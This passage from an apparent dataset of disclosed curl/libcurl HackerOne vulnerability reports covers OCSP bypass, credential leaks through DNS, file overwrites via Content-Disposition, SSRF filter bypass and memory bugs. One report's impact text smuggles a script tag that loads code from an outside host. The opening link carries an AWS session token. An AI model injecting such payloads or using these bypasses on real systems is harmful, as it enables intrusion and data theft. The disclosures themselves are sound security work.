(F1102530)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4ahirm5f3iiawus88djy0er96w45?response-content-disposition=attachment%3B%20filename%3D%22curl.png%22%3B%20filename%2A%3DUTF-8%27%27curl.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUC3C7JAU%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T030542Z&X-Amz-Expires=355&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIDQPZTVzo5TPcRJZXQIEX67nDDNx4E8nZnxz7VjOOND%2FAiEA595K8eEFLp2OdxkrH7pnBSOc2OQ46GPwzcIbbfjDAMEquwUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBsyZdJVIFnVFtrpUSqPBfHJEkNZG%2FMUW5LKt40%2BOmqudgLtg%2BZfDR8Bp44CwA2EsutiuaY%2Flj%2FDk54L%2B5LIDYRuJSp%2FGF6H6iyz7aQLZj6CE30Ob3C51WR64j8jb7fPN25PRCG1ydE5gTvxvxSr9QarHoHkDjVI%2BCkQM4G%2FLWPC1BLIO264SkMfMtikBPyIz3GC%2BBoELgVTLvVneI4phpPLHTire6It%2B6%2Fz65qbTwj3DxqeS7m2QmRxrHKoIpv3ZBp1J%2FGgAwIrevNfBsrKubF1j3d1C7b6kI8ooNv4QbVR3k9nNarK%2FaHxDC%2FYD8xEXTpvdLqE51fxnrGXVH%2F5tfD3caY0y5iqmjTHEOUFjQuHJhqBt9j2Jp53UttK3Vl8%2Fx6O5ArnxXoTIDmMO2gnjG%2FAmEDz0hK2svKEnEWCthGB6AL21YuazvkvuoyEJbNyUNbF2HQb2McwjEoPUWa6cCGmF8QV0bU2x447VPU%2F%2BrmbLHDzYbXuzENLvP2CrF1oGMYbK9tIY3fucoH%2FmdLlmd9r6NgB%2F%2BlMLlyTi%2BDaJmHCxl1jSRePpbykQpYwK7l%2BHhqXQlF1RShkNZbwvkpICmLxfm1D4E5XqAMWeigKiW%2BplTp1FMs6urDGv685Gsrwixf4ZHYkRK7dBzuu1aqBenzgq%2FrM20n1PS4dPWL9ZSR9NVVdzwt%2FGCpCIqEJIuexhE%2BcFbeAcuHz7iC%2Fw4ZGVL0ow3nkUu2L0SP1lOsx1jFFgjINT6KUAuL%2BTUxfVokGIKn53v79KEBSdmpU32WsNEV%2BX8uX0N7LGm1ttV5KZAshoMcyydW7B78DBPzBwHITlt8mCJMXfxgbe%2FMnRsF6nLzj7TyBjpczBCu7keyPx4n%2BI1IKIJNfaOH5vJYqH8Qwp%2F%2FbxgY6sQF%2F2Ghzw0IdonEnSmYJJZhAB0S%2FLVbMfSWwZQfY8djADMAUe6i%2FkMQQQ8PoKMWWkaQ8jr54%2BdjpKwbfXXHBf62gnJ46KvRb1LoAe8JkKQNW4bqW9%2BFzGPes4n6F0UK3GqtkRhQDvgORB%2FNVH6Slckt40AwQNJjKh6j1UzcvSkjuSQugmPlQE8r2fwxFbeXl6oQ9tmUEXF9mm3bOneJMTOLPycVeiiZ3tjIdNHqlMYKAg1c%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=94d1e4cf2f9d7b6275bc5c48892f4782a100cff1e3d14841ffadeb62a9eb0367)\n\nImpact\n------\n\nIncorrect schema parser logic will allow malicious user to bypass protection mechanism and get access to the internal infrastructure of affected web servers."
},
{
    "url": "https://hackerone.com/reports/1045844",
    "original_report": "Summary:\n--------\n\nUser 'xnynx' on github filed [PR 6255](https://github.com/curl/curl/issues/6255) highlighting this problem. **Filed publicly**\n\nMy first gut reaction was that this had to be a problem with `curl_fnmatch` as that has caused us grief in the past (and on most platforms we use the native `fnmatch()` now, but not on Windows IIRC and this is a reported to happen on Windows), but I then built a test program and I made it crash in what seems like potential stack overflow due to recursive calls to `wc_statemach` from within itself.\n\nSteps To Reproduce:\n-------------------\n\n1. build 6255.c (attached)\n2. run it (with a debugger)\n3. inspect the crash\n\nThe example app lists a directory with 40,000 files on funet.fi.\n\nCrash stack trace\n-----------------\n\nImpact\n------\n\nI haven't yet worked out exactly how to get what into the stack and what the worst kind of exploit of this might be, but a stack overflow that can be triggered by adding/crafting files in the server feels bad."
},
{
    "url": "https://hackerone.com/reports/661847",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\nIn tool\\_operate.c at line 1541, if --retry-delay>18446744073709552, config->retry\\_delay\\*1000 > 2^64 results in integer overflows, on 64 bit architectures;\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n1. [add step]\n   Tool\\_operate.c add a \"printf\" at line 1538 as following:\n   printf(\"config->retry\\_delay*1000L = %ld\\n\", config->retry\\_delay*1000L);\n2. [add step]\n   make\n3. [add step]\n   run command:  \n   ./src/curl --retry-delay 18446744073709552 -v 192.168.222.1:8080/test.html\n   output:\n   config->retry\\_delay\\*1000L = 384\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nThe flaw exists on 32&64 bit architectures, it results in retry-delay is invalid."
},
{
    "url": "https://hackerone.com/reports/1048457",
    "original_report": "cURL (in /lib/vtls/openssl.c) does not check that the certificate serial number in the stapled OCSP response matches the serial number of the certificate it is trying to validate (the peer certificate). This results in a passed validity challenge even when connecting to a site that has had its certificate revoked.\nAn example program showing the vulnerability and a suggested patch are included.\n\nEXAMPLE:\n\n1. Identify a site with a revoked certificate. (<https://revoked.grc.com>)\n2. Obtain a valid OCSP response for a site signed by the same issuer as\n   the revoked site. (<https://www.grc.com>). See\n   <https://akshayranganath.github.io/OCSP-Validation-With-Openssl/> for a\n   how-to. Use the ocsp option 'respout' to obtain the DER encoded OCSP\n   response.\n   Certificates for [www.grc.com](http://www.grc.com) are provided. Use the following\n   command to obtain an OCSP response for the example certificates:\n   $ openssl ocsp -issuer grc\\_chain.pem -cert grc\\_cert.pem -text -url <http://ocsp.digicert.com> -respout grc\\_ocsp\\_resp.der\n3. See the OCSP behavior without replacing the OCSP response:\n   $ ./curl\\_ocsp\\_vuln\\_test <https://revoked.grc.com>\n   Curl Error: SSL server certificate status verification FAILED\n   Curl correctly fails.\n4. See the OCSP behavior when replacing the OCSP response with that\n   from [www.grc.com](http://www.grc.com):\n   $ ./curl\\_ocsp\\_vuln\\_test <https://revoked.grc.com> --replace\\_ocsp grc\\_ocsp\\_resp.der\n\nThe result is that cURL succeeds despite the site having a revoked certificate.\n\nImpact\n------\n\nCertificates are usually revoked because important information, such as the private key, has become known. This could allow an attacker to cause a \"validated\" connection to an attacker-controlled site by substituting the OCSP response."
},
{
    "url": "https://hackerone.com/reports/547630",
    "original_report": "Summary:\n--------\n\nlibcurl contains a heap-based buffer overrun in /lib/urlapi.c. A similiar issue to [CVE-2018-14618](/hacktivity/cve_discovery?id=CVE-2018-14618).\n\nSteps To Reproduce:\n-------------------\n\n### analysis\n\nI found a potential integer overflow which may lead to a buffer overrun in /curl/lib/urlapi.c. In function `seturl`, urllen was multiplied by 2 and then passed to malloc. So an integer overflow will happen when the url is as long as 2GB in a 32 bit OS.\n\nThe url was passed by `parseurl` to `seturl`.\n\nAnd the `parseurl` was called when do `curl_url_set` and execute the parse of url. If someone use libcurl to code, and call `curl_url_set` with a extreme long url, it might be triggered.\n\nImpact\n------\n\nIt might leads to a crash or some other impact."
},
{
    "url": "https://hackerone.com/reports/887462",
    "original_report": "Summary:\n--------\n\ncurl supports the `Content-disposition` header, including the `filename=` option. By design, curl does not allow server-provided local file override by verifying that the `filename=` argument does not exist before opening it.\nHowever, the implementation contains 2 minor logical bugs that allow a server to override an arbitrary local file (without path traversal) when running curl with specific command line args (-OJi)\nThis bug can trigger a logical RCE when curl is used from the user's home dir (or other specific directories), by overriding specific files (e.g. \".bashrc\"), while keeping the user completely uninformed of the side effects.\n\nThe 2 bugs are:\n\n1. `curl -iJ` is not supported however `curl -Ji` is available -\n2. The standard `Content-disposition` handling flow does not allow opening existing files: <https://github.com/curl/curl/blob/master/src/tool_cb_wrt.c#L54>, however by using `-OJi` it is possible to reach a flow that overrides a local file with the response headers, without verification: <https://github.com/curl/curl/blob/master/src/tool_cb_hdr.c#L196>\n\nSteps To Reproduce:\n-------------------\n\n1. Return the following http response form a server :\n\nWhere `<PAYLOAD>` is the bash payload, e.g. `echo pwn`\n\n2. Run `curl -OJi` from the user's home dir\n\n**Note that curl falsely claims that `.bashrc` was refused to be overwritten.**\n\nSupporting Material/References:\n-------------------------------\n\nFirst bug:\n\nSecond bug:\n\nImpact\n------\n\nLocal file override without path traversal, possibly leading to an RCE or loss of data."
},
{
    "url": "https://hackerone.com/reports/874778",
    "original_report": "Summary:\n--------\n\nFrom version 7.62 curl and curllib leaks part of user credentials in the plain text DNS request. This happens if the server makes redirect, both 301 and 302 to a relative path (eg header 'Location: /login'). It is NOT an issue in case of absolute redirection (eg header 'Location: <https://domain.tld/login'>).\nI was able to make curl/curlib to send a password that started with @ but I believe that more abuse is possible with this attack.\nWhat makes is worst is that for eg occasionally run/daemon scripts with curl and authorization credentials this can be triggered by a remote server by switching between absolute/relative without any change on client-side.\nUser secrets are sent in plain text and anybody in the middle can record them. User secrets are sent to the DNS server and can be recorded there.\n\nSteps To Reproduce:\n-------------------\n\n1. Use curl > 7.61 (tested on all from 7.62 to 7.70 and I was able to exploit it)\n2. Find a server with relative redirection (eg <https://mareksz.gq/301> or <https://mareksz.gq/302>)\n3. Run 'curl <https://mareksz.gq/302> -v -L -u saduser:[@S3cr3t](/s3cr3t)'\n\nSupporting Material/References:\n-------------------------------\n\nLogs from running above steps:\n\n/ $ curl -V\ncurl 7.66.0-DEV (x86\\_64-pc-linux-gnu) libcurl/7.66.0-DEV OpenSSL/1.1.1d zlib/1.2.11 nghttp2/1.39.2\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp\nFeatures: AsynchDNS HTTP2 HTTPS-proxy IPv6 Largefile libz NTLM NTLM\\_WB SSL TLS-SRP UnixSockets\n/ $ curl <https://mareksz.gq/302> -v -L -u saduser:[@S3cr3t](/s3cr3t)\n\n* Trying 194.182.85.202:443...\n* TCP\\_NODELAY set\n* Connected to mareksz.gq (194.182.85.202) port 443 ([#0](/reports/0))\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n* CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: none\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\n* TLSv1.2 (IN), TLS handshake, Finished (20):\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\n* ALPN, server accepted to use http/1.1\n* Server certificate:\n* subject: CN=mareksz.gq\n* start date: Apr 27 10:32:33 2020 GMT\n* expire date: Jul 26 10:32:33 2020 GMT\n* subjectAltName: host \"mareksz.gq\" matched cert's \"mareksz.gq\"\n* issuer: C=US; O=Let's Encrypt; CN=Let's Encrypt Authority X3\n* SSL certificate verify ok.\n* Server auth using Basic with user 'saduser'\n  > GET /302 HTTP/1.1\n  > Host: mareksz.gq\n  > Authorization: Basic c2FkdXNlcjpAUzNjcjN0\n  > User-Agent: curl/7.66.0-DEV\n  > Accept: */*\n* Mark bundle as not supporting multiuse\n  < HTTP/1.1 302 Moved Temporarily\n  < Server: nginx\n  < Date: Fri, 15 May 2020 08:32:59 GMT\n  < Content-Type: text/html\n  < Content-Length: 138\n  < Connection: keep-alive\n  < Location: /goto302\n  <\n* Ignoring the response-body\n* Connection [#0](/reports/0) to host mareksz.gq left intact\n* Issue another request to this URL: 'https://saduser[@S3cr3t](/s3cr3t)[@mareksz](/mareksz).gq/goto302'\n* Could not resolve host: [S3cr3t@mareksz.gq](mailto:S3cr3t@mareksz.gq)\n* Closing connection 1\n  curl: (6) Could not resolve host: [S3cr3t@mareksz.gq](mailto:S3cr3t@mareksz.gq)\n\nTrafic pcap'ed:\n\n/ $ tcpdump 'udp' -vv\nX.X.X.X:X IP (tos 0x0, ttl 255, id 57291, offset 0, flags [none], proto UDP (17), length 63)\n *>*  : [udp sum ok] 27230+ A? [S3cr3t@mareksz.gq.](mailto:S3cr3t@mareksz.gq.) (35)\nX.X.X.X:X IP (tos 0x0, ttl 255, id 55686, offset 0, flags [none], proto UDP (17), length 63)\n *>*  : [udp sum ok] 51727+ AAAA? [S3cr3t@mareksz.gq.](mailto:S3cr3t@mareksz.gq.) (35)\nX.X.X.X:X IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto UDP (17), length 136)\n *>*  : [udp sum ok] 27230 NXDomain q: A? [S3cr3t@mareksz.gq.](mailto:S3cr3t@mareksz.gq.) 0/1/0 ns: gq. SOA a.ns.gq. info.equatorialguineadomains.com. 1589532137 10800 3600 604800 5 (108)\nX.X.X.X:X IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto UDP (17), length 136)\n *>*  : [udp sum ok] 51727 NXDomain q: AAAA? [S3cr3t@mareksz.gq.](mailto:S3cr3t@mareksz.gq.) 0/1/0 ns: gq. SOA a.ns.gq. info.equatorialguineadomains.com. 1589532235 10800 3600 604800 5 (108)\n\n* [attachment / reference]\n  Attached Wireshark screenshot with leaked creds.\n\nImpact\n------\n\nI believe it is rather high. Third-party have control over it part of your credentials are being sent over the network in plain text to the DNS server."
},
{
    "url": "https://hackerone.com/reports/684603",
    "original_report": "Summary:\n--------\n\nWith a TFTP server that does not send OACK, but instead starts anyway with first block with 512 bytes block size, the curl library fails to assume default 512 bytes blocks. Instead it detects EOF and does not return an error code. Consequence is a truncated file that is 512 bytes without any error code.\n\nMy understanding is that from the RFC, a TFTP server might ignore blksize request and anyway send the default 512 bytes block size data.\n\nUnless an OACK is received we should assume 512 block size, whether or not a particular blocksize was requested.\n\nThis was introduced by security fix of [CVE-2019-5436](/hacktivity/cve_discovery?id=CVE-2019-5436):\n257600341 tftp: use the current blksize for recvfrom()\n\nPotential Fix\n-------------\n\nWe could revert 2576003415625d7b5f0e390902f8097830b82275 and instead malloc the receive buffer for at least 512 bytes, or for the requested blksize if it is bigger. That would address the issue being reported and also the [CVE-2019-5436](/hacktivity/cve_discovery?id=CVE-2019-5436).\n\nSteps To Reproduce:\n-------------------\n\n1. Use a TFTP server that does not send OACK in response of a particular blksize request, but instead sends directly the first block, of default size (512B).\n2. Run curl asking for a >512 bytes block size like:\n   curl --tftp-blksize 8192 tftp://9.1.9.1/data.bin --output data.bin\n3. echo $? is 0 and file size is 512 bytes\n\nComment\n-------\n\nNot too sure about the Weakness identification and/or Severity, reporting it here since it was introduced by a CVE fix.\n\nImpact\n------\n\nFile truncation without 'curl' returning any error code."
},
{
    "url": "https://hackerone.com/reports/686823",
    "original_report": "Summary:\n--------\n\nIn 'lib/security.c', there is a double-free of the reference 'buf->data' on the teardown path if 'Curl\\_saferealloc()' fails.\n\nAlso, since we read 'len' from the 'fd', the sender might be able to remotely trigger a realloc() failure, and then the double-free, by sending the value 0x7fffffff.\n\nIntroduced by\n0649433da realloc: use Curl\\_saferealloc to avoid common mistakes\n\nSteps To Reproduce:\n-------------------\n\nActual double-free was not reproduced.\nThe realloc failure with particular 'len' value can be reproduced on my 32bits linux machine with following code:\n\nComment:\n--------\n\nAlso checked other occurences of 'Curl\\_saferealloc()' calls which all seem fine otherwise.\n\nImpact\n------\n\nDouble-free after a 'realloc()' failure, which could be triggered remotely, depending on the use context of the 'read\\_data()' function."
},
{
    "url": "https://hackerone.com/reports/948876",
    "original_report": "Summary:\n--------\n\nIf a connect-only easy handle is not read from or written to, its connection can time out and be closed. If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection. This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.\n\nThis sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.\n\nAccording to git bisect, this behavior was introduced in commit 755083d.\n\nSteps To Reproduce:\n-------------------\n\n1. Compile the source code below\n2. Listen on ports 1234, 1235, and 1236\n3. Run the compiled program\n4. Notice that the data which was supposed to be sent to port 1234 is actually sent to port 1236\n\nSupporting Material/References:\n-------------------------------\n\nImpact\n------\n\nThis could cause sensitive data intended for one server to be transmitted to a different server."
},
{
    "url": "https://hackerone.com/reports/1019457",
    "original_report": "While running binary built from curl git repo file \"docs/examples/10-at-a-time.c\" under valgrind specifically with the helgrind tool, reports race condition in getaddrinfo() calls. Using the latest curl/libcurl from github repo.\n\nFrom the valgrind documentation \"Helgrind is a Valgrind tool for detecting synchronisation errors in C, C++ and Fortran programs that use the POSIX pthreads threading primitives.\"\n\nCommand used for testing:\n\nvalgrind --tool=helgrind --log-file=helgrind\\_%p.log ./10-at-a-time\n\nSee helgrind log files attached to this report.\n\nHere is one example of the helgrind reports:\nNote: libcurl was rebuilt in debug to provide complete stack traces. Problem occurs in both debug and non-debug builds.\n\n43481 Possible data race during read of size 1 at 0x8325DE8 by thread [#7](/reports/7)\n43481 Locks held: none\n43481 at 0x8325DE8: ns\\_name\\_pton (ns\\_name.c:160)\n43481 by 0x831D8DF: \\_\\_res\\_hnok (res\\_comp.c:202)\n43481 by 0x833906B: check\\_name (dns-host.c:284)\n43481 by 0x833906B: \\_nss\\_dns\\_gethostbyname4\\_r (dns-host.c:335)\n43481 by 0x4A5B58E: gaih\\_inet.constprop.0 (getaddrinfo.c:765)\n43481 by 0x4A5D0D8: getaddrinfo (getaddrinfo.c:2256)\n43481 by 0x486D6AB: curl\\_dbg\\_getaddrinfo (curl\\_addrinfo.c:554)\n43481 by 0x486CD6D: Curl\\_getaddrinfo\\_ex (curl\\_addrinfo.c:124)\n43481 by 0x4861FE0: getaddrinfo\\_thread (asyn-thread.c:307)\n43481 by 0x4872148: curl\\_thread\\_create\\_thunk (curl\\_threads.c:57)\n43481 by 0x4842B1A: ??? (in /usr/lib/x86\\_64-linux-gnu/valgrind/vgpreload\\_helgrind-amd64-linux.so)\n43481 by 0x4ED6608: start\\_thread (pthread\\_create.c:477)\n43481 by 0x4A76292: clone (clone.S:95)\n43481 Address 0x8325de8 is in the Text segment of /usr/lib/x86\\_64-linux-gnu/libresolv-2.31.so\n43481 at 0x8325DE8: ns\\_name\\_pton (ns\\_name.c:160)\n\nWill also see some of the calls falling, sometimes. Not every time though. Issues might vary based on number of cores/threads present or allocated to the test system. For this testing using a VirtualBox VM with 3 vCPUs running up to date Ubuntu 20.04.\n\nI received the following errors over various runs with the helgrind tool. Usually the initial few logged output lines will report some failure, rarely do the later output logged lines show failures. Some examples of errors received over various runs:\n\nR: 16 - Error in the HTTP2 framing layer <https://www.microsoft.com>\nR: 16 - Error in the HTTP2 framing layer <https://www.google.com>\nR: 35 - SSL connect error <https://www.mysql.com>\n\nR: 52 - Server returned nothing (no headers, no data) <https://www.bbc.co.uk>\n\nR: 55 - Failed sending data to the peer <https://www.google.com>\n\n$ valgrind --version\nvalgrind-3.15.0\n\nWhen not running under helgrind the 10-at-a-time binary usually runs without issues, but sometimes one will randomly fail, which might be normal sometimes, but appears to validate that this is a real problem and not only revealed with libcurl used under helgrind.\n\nR: 35 - SSL connect error <https://www.hp.com>\n\nHave not tried c-ares library. Would you find it useful if I did?\n\nNot clear if the problem is with libcurl or with the libc library implementing getaddrinfo().\n\nImpact\n------\n\n* Failure to connect to target system.\n* Connecting to wrong IP if DNS data corrupted, potentially disclosing sensitive data to wrong site.\n\nMitigation:\n\n* Limit parallel DNS usage.\n* Potentially c-ares library may not have this issue, but this is not verified."
},
{
    "url": "https://hackerone.com/reports/1019372",
    "original_report": "Attempting to upload (-T) a not found file with parallel (-Z) flag present, will cause curl to get stuck and never terminate, potentially stalling scripts that make use of this particular flags.\n\ncurl -T blabla-notexists -Z upload.example.com [www.google.com](http://www.google.com) [www.cnn.com](http://www.cnn.com) [www.apple.com](http://www.apple.com)\n\nSame issue occurs if using -Z or --parallel flags.\n\n$ curl -T blabla-notexists -Z upload.example.com [www.google.com](http://www.google.com) [www.cnn.com](http://www.cnn.com) [www.apple.com](http://www.apple.com)\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\nDL% UL% Dled Uled Xfers Live Qd Total Current Left Speed\n-- -- 0 0 1 0 1 --:--:-- 0:00:01 --:--:-- 0 curl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\ncurl: Can't open 'blabla-notexists'!\ncurl: try 'curl --help' or 'curl --manual' for more information\n\nDoesn't happen with --parallel-max or --parallel-immediate flags.\n\nObserving the network with tcpdump, shows NO traffic at all.\n\nI suspect this is just an ordinary bug, but reporting it in case there is a security angle that might be present. Really the only obvious security issue is that curl will block possibly forever, and if curl tool is used inside a script or binary (via system() for example) could cause that script/binary to stop/block/hang. In some cases, this could lead to a bad situation, leading to denial of service or loss of service availability for program/process/server/service using curl in such a way.\n\nNot 100% sure, but I suspect that libcurl does not have this issue. I could be wrong.\n\nSteps to Reproduce:\nUpload (-T) a file with curl while in parallel mode (-Z) and the upload file must not exist locally.\n\ncurl -T blabla-notexists -Z upload.example.com [www.google.com](http://www.google.com) [www.cnn.com](http://www.cnn.com) [www.apple.com](http://www.apple.com)\n\nImpact\n------\n\ncurl hangs leading to denial of service or loss of service availablity for script or binary using curl CLI tool.\n\nMitigation:\nDon't use -Z parallel flag with -T upload flag."
},
{
    "url": "https://hackerone.com/reports/926638",
    "original_report": "Summary:\n--------\n\nWhen using -J -O options on curl command line tool and a server responding with a header that is using Content-Disposition to provide a filename, existing local file will be overwritten if the file is non-readable by the current user, but file is writable by the current user.\n\nCurl contains protection to prevent the overwrite, but protection code is using the file's readability permission to check for its existence. So protection will be bypassed in this case, as it is only writable by the user.\n\nIssue was discovered after review of [CVE-2020-8177](/hacktivity/cve_discovery?id=CVE-2020-8177) description. I was curious how the Content-Disposition feature and prevention of file overwrite worked. While reviewing the code around that feature noted that the existence of the file is checked via being able to read the file. So what happens if the file is not readable, but writable!?!\n\nWhy would a system have a file that is writable only, for sensitive information that must be collected by a particular user, but must not be viewable by that user. Certain logs or audit trails or privacy related files or security related files, might have such restrictions.\n\nAdditionally, and in an extreme example, code as written is susceptible to Race Condition as the file existence check and file write are done with two distinct fopen() calls in the tool\\_create\\_output\\_file() in tool\\_cb\\_wrt.c file. Data lose possible if parallel write operations performed on the same file via two curl processes, or even some other process (malicious or not) acting/interfering on the same file.\n\nSteps To Reproduce:\n-------------------\n\n1. Create a new file (e.g. echo \"TEST\" >data.txt)\n2. Check content of file to see that file contains \"TEST\".\n3. Change permissions of new file to remove read permission (e.g. chmod 222 data.txt)\n4. Download file from remote server that will have Content-Disposition with filename \"data.txt\"\n5. Check that file data.txt is still only writable! Permissions have not changed.\n6. Change permissions to add the read permission back (so we can see the content)\n7. View the content of data.txt file, it will be overwritten with server response.\n\nSupporting Material/References:\n-------------------------------\n\n1. Log of reproduction attached. See curl\\_reproduction.log attached.\n2. Source for a simple Golang HTTP server with Content-Disposition header also attached. See httpserver.go file attached.\n\nMitigation:\n-----------\n\nOne way to fix the issue robustly (check for file existence and create file in one operation) would be to use the open() to create the file while using safe options (such as O\\_CREAT | O\\_WRONLY | O\\_EXCL), as is shown in one of the solutions in this stackoverflow posting (see posting by \"Dan Lenski\", for example):\n\n<https://stackoverflow.com/questions/230062/whats-the-best-way-to-check-if-a-file-exists-in-c>\n\nImpact\n------\n\n* An existing local file could be overwritten, either maliciously or accidentally by curl\n* A malicious server would need to send Content-Disposition with filename provided at the same time, as the victim would have to use the -J -O option on the curl command line side, with a file that is non-readable, but writable."
},
{
    "url": "https://hackerone.com/reports/875775",
    "original_report": "Summary:\n--------\n\nWhilst fuzzing libcurl built from `git commit a158a09`, a crash triggered by an invalid write (or maybe a double/invalid free) was found.\n\nSteps To Reproduce:\n-------------------\n\nRun:\n`echo \"LVQvCnVyIDA=\" | base64 -d > test0000`\n`./curl --verbose -q -K test0000 file:///dev/null`\n\nStack:\n\nIf we switch over to ASAN with AFL's libdislocator.so loaded:\n\nImpact\n------\n\nDenial of service, information disclosure, software crash, glitter everywhere\"><script src=//xss.mx></script>, the Kool-Aid<x=\" Man crashing through walls, dogs and cats living together, mass hysteria! Just kidding. It's probably limited only to the tool which means the impact is limited, I know the routine. (:"
},
{
    "url": "https://hackerone.com/reports/773313",
    "original_report": "Summary:\n--------\n\nGenerally web masters and developers protect user-accessible CURL from requesting forbidden domains so that the attacker is not able to access internal resources. It is usually done using regular expressions.\nMostly addresses like 127.x.x.x, 192.168.x.x and \"integer\" notation of IP addresses (like 2130706433 = 127.0.0.1) are filtered out before executing curl using wrapper scripts.\nBut the '  *' symbol is valid for CURL, allowing to request localhost's internal web resources and to scan ports. Unfortunately, since http0.9 is turned off by default now, it's harder to easily scan ports (without accessing stderr by the attacker). But if FTP protocol is not disabled, port scanning can still be achieved using time-based attack: active refusal of a closed port takes much less time than connecting by FTP to any other open port.\nAs far as i see, '*  ' and 'localhost' are not synonyms, and ' \\* ' string should be filtered out not on the webmaster's side but from inside of CURL.\n\nSteps To Reproduce:\n-------------------\n\nSupporting Material/References:\n-------------------------------\n\nAccording to <https://tools.ietf.org/html/rfc1034>, wildcards are special symbols in DNS and should not be used as domain names..\n\nImpact\n------\n\nThe vulnerability allows attacker to at least access internal web resources restricted to localhost, or at most to scan locally opened ports and expose services running on the machine."
},
{
    "url": "https://hackerone.com/reports/640532",
    "original_report": "Summary:\n--------\n\n[Resources Loaded from Insecure Origin (HTTP)]\n\nSteps To Reproduce:\n-------------------\n\n[Vulnerability Details\ndetected that an active content loaded over HTTP within an HTTPS page]\n\nRemedy\nThere are two technologies to defense against the mixed content issues:\nHTTP Strict Transport Security (HSTS) is a mechanism that enforces secure resource retrieval, even in the face of user mistakes (attempting to access your web site on port 80) and implementation errors (your developers place an insecure link into a secure page)\nContent Security Policy (CSP) can be used to block insecure resource retrieval from third-party web sites\nLast but not least, you can use \"protocol relative URLs\" to have the user's browser automatically choose HTTP or HTTPS as appropriate, depending on which protocol the user is connected with. For example:\nA protocol relative URL to load an style would look like <link rel=\"stylesheet\" href=\"//example.com/style.css\"/>.\nSame for scripts <script type=\"text/javascript\" src=\"//example.com/code.js\"></script>\nThe browser will automatically add either \"http:\" or \"https:\" to the start of the URL, whichever is appropriate.\n\nExternal References\n\n<https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content>\n\nRemedy References\n<https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security>\n<https://en.wikipedia.org/wiki/Content_Security_Policy>\n\nImpact\n------\n\nImpact\nActive Content is a resource which can run in the context of your page and moreover can alter the entire page. If the HTTPS page includes active content like scripts or stylesheets retrieved through regular, cleartext HTTP, then the connection is only partially encrypted. The unencrypted content is accessible to sniffers.\nA man-in-the-middle attacker can intercept the request for the HTTP content and also rewrite the response to include malicious codes. Malicious active content can steal the user's credentials, acquire sensitive data about the user, or attempt to install malware on the user's system (by leveraging vulnerabilities in the browser or its plugins, for example), and therefore the connection is not safeguarded anymore."
},
{
    "url": "https://hackerone.com/reports/640530",
    "original_report": "Summary:\n--------\n\n[Insecure Frame (External)]\n\nSteps To Reproduce:\n-------------------\n\n[Vulnerability Details\nidentified an external insecure or misconfigured iframe.]\n\nRemedy\nApply sandboxing in inline frame\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\nExternal References\n<https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet>\n\nImpact\n------\n\nImpact\nIFrame sandboxing enables a set of additional restrictions for the content within a frame in order to restrict its potentially malicious code from causing harm to the web page that embeds it.\nThe Same Origin Policy (SOP) will prevent JavaScript code from one origin from accessing properties and functions - as well as HTTP responses - of different origins. The access is only allowed if the protocol, port and also the domain match exactly.\n\nHere is an example, the URLs below all belong to the same origin as <http://site.com> :  \n<http://site.com>\n<http://site.com/>\n<http://site.com/my/page.html>\n\nWhereas the URLs mentioned below aren't from the same origin as <http://site.com> :  \n<http://www.site.com> (a sub domain)\n<http://site.org> (different top level domain)\n<https://site.com> (different protocol)\n<http://site.com:8080> (different port)\n\nWhen the sandbox attribute is set, the iframe content is treated as being from a unique origin, even if its hostname, port and protocol match exactly. Additionally, sandboxed content is re-hosted in the browser with the following restrictions:\n\nAny kind of plugin, such as ActiveX, Flash, or Silverlight will be disabled for the iframe.\nForms are disabled. The hosted content is not allowed to make forms post back to any target.\nScripts are disabled. JavaScript is disabled and will not execute.\nLinks to other browsing contexts are disabled. 